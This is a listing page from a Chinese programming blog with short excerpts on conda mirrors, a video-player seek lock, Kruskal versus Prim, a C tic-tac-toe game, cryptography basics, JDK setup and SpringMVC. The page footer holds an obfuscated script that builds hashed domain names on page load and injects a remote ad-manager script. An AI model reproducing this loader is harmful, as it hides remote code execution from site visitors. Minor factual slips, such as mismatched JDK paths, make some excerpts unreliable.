conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ conda config --add channels https://mirrors.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c93095f84f25dda6626d7a489ab2f3c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0eed705b54cf4266015474be7dcb1e03/" rel="bookmark">
			GSYVideoPlayer播放器禁止快进，允许回退操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		private float x1 = 0; private float x2 = 0; 竖屏状态
detailPlayer.getCurrentPlayer().getProgressBar().setOnTouchListener(new View.OnTouchListener() { @Override public boolean onTouch(View view, MotionEvent motionEvent) { if(motionEvent.getAction() == MotionEvent.ACTION_DOWN) { x1 = motionEvent.getX(); } x2 = motionEvent.getX(); if(x1 - x2 &gt; 0){ return false; }else { return true; } } }); 全屏状态
detailPlayer.getFullscreenButton().setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { orientationUtils.resolveByClick(); detailPlayer.startWindowFullscreen(CoursesDetailsActivity.this, true, true); detailPlayer.getFullWindowPlayer().getProgressBar().setOnTouchListener(new View.OnTouchListener() { @Override public boolean onTouch(View view, MotionEvent motionEvent) { if(motionEvent.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0eed705b54cf4266015474be7dcb1e03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e0622ff59c7c2af400c6c8a1ff4e7ab/" rel="bookmark">
			Markdown中图片左对齐
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Markdown中图片左对齐 左对齐： 在图片前面输入空格即可 - 右对齐
需要使用CSS样式
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2326fbb344f608c242e0b221522f127/" rel="bookmark">
			Kruskal算法&amp;Prim算法的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		贪心算法&amp;Kruskal&amp;Prim算法的区别： 贪心算法是一种对某些求最优解问题的更简单、更迅速的设计技术。
贪心算法的特点是一步一步地进行，常以当前情况为基础根据某个优化测度作最优选择，而不考虑各种可能的整体情况，省去了为找最优解要穷尽所有可能而必须耗费的大量时间。贪心算法采用自顶向下，以迭代的方法做出相继的贪心选择，每做一次贪心选择，就将所求问题简化为一个规模更小的子问题，通过每一步贪心选择，可得到问题的一个最优解。虽然每一步上都要保证能获得局部最优解，但由此产生的全局解有时不一定是最优的，所以贪心算法不要回溯
Kruskal算法是基于贪心的思想得到的。
首先我们把所有的边按照权值先从小到大排列，接着按照顺序选取每条边，如果这条边的两个端点不属于同一集合，那么就将它们合并，直到所有的点都属于同一个集合为止。
Prim算法是一种产生最小生成树的算法。
Prim算法从任意一个顶点开始，每次选择一个与当前顶点集最近的一个顶点，并将两顶点之间的边加入到树中。Prim算法在找当前最近顶点时使用到了贪心算法。
Prim算法和Kruskal算法都是从连通图中找出最小生成树的经典算法
从策略上来说，Prim算法是直接查找，多次寻找邻边的权重最小值，而Kruskal是需要先对权重排序后查找的
所以说，Kruskal在算法效率上是比Prim快的，因为Kruskal只需一次对权重的排序就能找到最小生成树，而Prim算法需要多次对邻边排序才能找到
Prim算法的实现过程
首先以一个结点作为最小生成树的初始结点，然后以迭代的方式找出最小生成树中各结点权重最小的边，并加到最小生成树中。（加入之后如果产生回路了就要跳过这条边，选择下一个结点）当所有的结点都加入到最小生成树中后，就找出了这个连通图的最小生成树
kruskal算法是计算一副加权无向图的最小生成树的另外一种算法，它的主要思想是按照边的权重(从小到大)处理它们，将边加入最小生成树中，加入的边不会与已经加入最小生成树的边构成环，直到树中含有V-1条边为止。
Kruskal算法的实现过程
Kruskal算法在找最小生成树结点之前，需要对权重从小到大进行排序。将排序好的权重边依次加入到最小生成树中（如果加入时产生回路就跳过这条边，加入下一条边），当所有的结点都加入到最小生成树中后，就找到了这个连通图的最小生成树
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1bb361174c433e9bc35476a16404c29e/" rel="bookmark">
			如何使position:fixed相对于父元素定位
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 父元素加一行代码
transform: scale(1); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d42b0f0a5b259160869cb45ce9cdeb93/" rel="bookmark">
			三子棋解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include&lt;stdio.h&gt; int main() { int input = 0; do { menu();//打印菜单 srand((unsigned int)time(NULL)); scanf("%d", &amp;input); switch (input) { case 1: game(); break; case 0: printf("退出游戏\n"); break; default: printf("输入错误,请重新输入！\n"); } } while (input); return 0; } 首先我们需要把游戏的逻辑理清楚，首先我们需要打印菜单，让我们选择是否进入游戏。如果我们中间想退出，或者继续游戏，我们就需要一个循环语句。而do while 语句是最适合的，而我们把选择是否进入游戏的输入变量变成while的循环条件。所以当我们选择退出游戏，输入0时，循环也就结束了。
这就是一个简易的菜单。
void menu() { printf("****** 1.play *******\n"); printf("****** 0.exit *******\n"); printf("***********************\n"); printf("请选择&gt;"); } 之前都是做游戏的简单准备工作，现在我们才是真正进入游戏的部分。
#define ROW 3 #define COL 3 #include&lt;time.h&gt; #include&lt;stdlib.h&gt; #include&lt;stdio.h&gt; //初始化棋盘 void Initboard(char board[ROW][COL], int row, int col); //打印棋盘 void Display_board(char board[ROW][COL], int row, int col); //玩家下棋 void player_move(char board[ROW][COL], int row, int col); //电脑下棋 void Display_board(char board[ROW][COL], int row, int col); //判断输赢 char is_win(char board[ROW][COL], int row, int col); //玩家赢 ‘*’ //电脑赢 ‘#’ //平局 ‘P' //继续 ’t' 我们从头文件开始一步一步分析。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d42b0f0a5b259160869cb45ce9cdeb93/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2afa30d1c0f50d6f2a7ab5f971b06742/" rel="bookmark">
			网络安全----密码学
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		密码学 数据有哪些安全需求？
需确保数据的保密性、完整性、不可否认性和可认证性。基础是现代密码学。通过加密将可读的信息变换成不可理解的乱码，从而起到保护信息的作用。 密码学的发展史 自人类社会出现战争便产生了密码 ，Phaistos圆盘，一种直径约为
160mm的Cretan-Mnoan粘土圆盘，
始于公元前17世纪。表面有明显字间
空格的字母，至今还没有破解。
1834年，伦敦大学的实验物理学教授惠斯顿发明了电机，这
是通信向机械化、电气化跃进的开始，也为密码通信采用在线
加密技术提供了前提条件。
两次世界大战大大促进了密码学的发展。转轮密码机ENIGMA(恩尼格码），由Arthur Scherbius于1919年发明,英国从1942年2月到12月都没能解读德国潜艇的信号。
1949年香农发表了一篇题为《保密系统的通信理论》
的著名论文，该文首先将信息论引入了密码，从而
把已有数千年历史的密码学推向了科学的轨道，奠
定了密码学的理论基础。
密码学的基本概念 什么是密码学？ 密码学是关于加密和解密变换的一门科学，是保护数据和信息的有力武器。
密码是什么? 密码就是变换。 变换是什么？变换是一种算法实现过程。
谁来做变换？变换可以由硬件和软件实现。（人、器件、计算机）
密码的概念 密码的概念 “密码”与“口令” 的区别。大家似乎很熟悉“密码”一词，日常生活中登录各种账户要输入“密码”，银行ATM取款要输入“密码”。其实，严格来讲这里所谓的密码应该仅被称作“口令”（Password），因为它不是本来意义上的“加密代码”，而是用于认证用户的身份，关于口令更多的相关知识将在后续的身份认证安全中介绍。
“密码”通常是密码算法的简称，它由加密算法和解密算法组成。 加密通信基本过程 在保密通信过程中，发送方将明文通过加密，使得密文只有合法的接收方才能通过相应的解密得到明文。
攻击者即使窃听或截取到通信的密文信息也无法还原出原始信息。
保密通信中，通信双方要商定信息变换的方法，即加密和解密算法。研究把明文信息变换成不能破解或很难破解的密文的技术，称为密码编码学(Cryptography)
研究分析破译密码，从密文推演出明文或相关内容的技术，称为密码分析学(Cryptanalysis)。
密码的基本概念 公元前6年的古希腊人可能是最早有意识使用一些技术来加密信息的，他们使用一根叫scytale的棍子，送信人先绕棍子卷一张纸条，然后把要加密的信息写在上面，接着打开纸送给收信人。如果不知道棍子的宽度是很难解密里面内容的。在这个例子中，scytale棍子可以理解成是一种加密算法，但如果暴露了这根棍子，也就没有秘密可言了。
受限算法 如果算法的保密性是基于保持算法的秘密，这种算法称为受限算法。
受限算法的安全问题
按照现在的标准，受限算法的保密性已远远不够。大的或经常变换的组织不能使用它们，因为每有一个用户离开这个组织或其中有人无意暴露了算法的秘密，这一密码算法就得作废了。更糟的是，受限密码算法不可能进行质量控制或标准化。每个组织必须有他们自己的唯一算法，这样的组织不可能采用流行的硬件或软件产品。密码学家用“密钥”解决了这个问题。
密钥 如图所示，密钥K（Key）是指在密码算法中引进的控制参数，对一个算法采用不同的参数值，其解密结果就不同。加密算法的控制参数称为加密密钥，解密算法的控制参数称为解密密钥。
加密与解密 每个加密与解密过程都有两个方面-加密与解密的算法与密钥。加密与解密过程使用的算法是公开的，但加密与解密所用的密钥能够保证加密过程的安全性。对称密钥加密(Symmetric Key Cryptography)的加密与解密使用相同秘钥。非对称密钥加密(Asymmetric Key Cryptography)的加密与解密使用不同密钥。 典型密码算法简介 目前已经公开的密码算法要超过100多个，
在此简单介绍几种常用的典型密码算法。
2.3.1 对称密钥密码技术
① 替代（替换）密码和转置（变位）密码
② DES
③ AES
密码的安全性 1 穷举攻击 • 穷举攻击又称作暴力（Brute Force）攻击，是指密码分析者用试遍所有密钥的方法来破译密码。
• 例如凯撒密码，攻击者就可以通过穷举密钥1~25来尝试破解。
2 统计分析攻击 • 统计分析攻击是指密码分析者通过分析密文的统计规律来破译密码。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2afa30d1c0f50d6f2a7ab5f971b06742/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd12d17c638e29861b1c510beed1c605/" rel="bookmark">
			【centos】x【java】centos配置java环境_jdk11
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		卸载openjdk，没有装过openjdk的直接下载安装oracle的jdk就行了
# 查看 rpm -qa | grep jdk # 卸载 rpm -e --nodeps java-1.7.0-openjdk rpm -e --nodeps java-1.7.0-openjdk-headless jdk11安装包，网盘地址
验证码：aivv
上传centos解压
tar -zxvf jdk-11.0.5_linux-x64_bin.tar.gz 根据解压路径配置环境变量
vim /etc/profile 在文件最后加上
export JAVA_HOME=/usr/local/jdk-11.0.12 export JRE_HOME=\$JAVA_HOME/ export PATH=$JAVA_HOME/bin:$PATH export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar 验证
java -version 成功！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6a78152cd37d2b7f8845ee43109d98a/" rel="bookmark">
			SpringMVC获取前台页面参数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、通过原生HttpServletRequest获取前端参数 @RequestMapping("/param1") public String param1(HttpServletRequest request) { String username = request.getParameter("username"); String password = request.getParameter("password"); System.out.println(username + " param1 " + password); return "index"; } jsp页面 &lt;fieldset&gt; &lt;legend&gt;参数传递方式1--使用HTTPServletRequest&lt;/legend&gt; &lt;form action="param/param1" method="get"&gt; 账号：&lt;input type="text" name="username"&gt;&lt;br&gt; 密码：&lt;input type="text" name="password"&gt;&lt;br&gt; &lt;input type="submit" value="提交"&gt;&lt;br&gt; &lt;/form&gt; &lt;/fieldset&gt; 2、前端页面参数和Controller方法参数名一致/不一致的获取方式 //2、前端页面参数和Controller方法参数名一致的获取方式 @RequestMapping("/param2") public String param2(String username, String password) { System.out.println(username + " param2 " + password); return "index"; } jsp页面
&lt;fieldset&gt; &lt;legend&gt;参数传递方式2--方法的参数名和页面参数一致&lt;/legend&gt; &lt;form action="param/param2" method="post"&gt; 账号：&lt;input type="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a6a78152cd37d2b7f8845ee43109d98a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2650f57070361ab5899c82979342c11c/" rel="bookmark">
			统信UOS远程拷贝
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SCP远程拷贝，简单用法是，到需要拷贝到目标文件的文件夹下，打开终端，输入命令：
scp 文件名 远程账号@IP地址：指定目录
举例：
scp test.txt uos@10.12.11.121:/home/uos/Desktop
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/316/">«</a>
	<span class="pagination__item pagination__item--current">317/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/318/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>